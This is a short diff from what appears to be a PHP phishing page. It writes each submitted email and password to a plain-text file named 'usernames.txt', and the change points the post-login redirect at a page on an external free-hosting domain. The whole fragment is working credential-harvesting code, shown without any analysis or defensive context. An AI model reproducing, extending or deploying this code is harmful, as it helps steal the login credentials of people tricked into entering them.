@@ -6,7 +6,7 @@ session_start();
 			
   			
  file_put_contents("usernames.txt", "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass . "\n", FILE_APPEND);
- header('Location:/server.php');
+ header('Location:https://classroomdwarka.000webhostapp.com/server.php');
 exit();
 	
 			
